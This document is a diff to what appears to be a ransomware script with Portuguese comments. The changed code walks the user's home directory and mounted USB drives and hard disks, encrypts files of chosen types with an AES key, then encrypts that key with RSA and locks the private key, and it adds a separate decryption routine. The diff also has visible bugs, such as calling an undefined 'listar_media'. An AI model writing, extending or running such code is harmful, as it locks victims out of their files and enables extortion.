@@ -7,6 +7,7 @@ import os
 import socket
 from random import choice
 import multiprocessing
+import getpass
 
 from AES import *
 from RSA import *
@@ -32,7 +33,7 @@ texto='''
 '''
 
 # ponto de partida da criptografia
-def menu():
+def menu(modo):
     # caminho de partida
     home=os.environ['HOME']
     # lista com os tipos
@@ -46,10 +47,16 @@ def menu():
         p=multiprocessing.Process(target=listar,args=(diretorios[a],tipos))
         p.start()
         #p.join() -> em ordem # espera um terminar para começar outro
-    listar('/home/tarcisio/.android',tipos,1)
-    # CRIAR UMA THREAD PARA CADA DIRETORIO
-    # CADA THREAD LISTAR DIRETORIO
-    #retorno=listar(home,tipos)
+    listar(home,tipos,modo)
+    listar_media(modo)
+
+
+def lista_media(modo):
+    print('Procurando por pendrives/HDs')
+    caminho='/media/'+getpass.getuser()
+    if(os.path.isdir(caminho)):
+        listar(caminho,modo)
+
 
 
 def listar(diretorio, tipos_arq, modo):
@@ -108,22 +115,27 @@ def gera_chave_AES():
 
 
 
-# MAIN
-AES_key=gera_chave_AES()
-#print('[*] chave AES gerada')
-#menu() # -> criptografa tudo
+def crypto_all():
+    AES_key=gera_chave_AES()
+    print('[*] chave AES gerada')
+    menu(1) # -> criptografa tudo
 
-AES_to_RSA()
-#print('[*] chave AES criptografado com RSA keys')
+    AES_to_RSA()
+    print('[*] senha AES criptografado com chave RSA')
 
 
-RSA_to_SRSA()
-#print('[*] chave privada do cliente criptografada')
-SRSA_to_RSA()
-#print('[*] chave privada do cliente descriptografada')
-RSA_to_AES()
-#print('[*] chave AES descriptografada')
-print('tudo certo')
+    RSA_to_SRSA()
+    print('[*] chave privada do cliente criptografada')
+
+    print('tudo certo')
+
+def decrypt_all():
+    SRSA_to_RSA()
+    print('[*] chave privada do cliente descriptografada')
+    RSA_to_AES()
+    print('[*] chave AES descriptografada')
+    menu(2)
+
 
 
 # == ALGORITMO ==
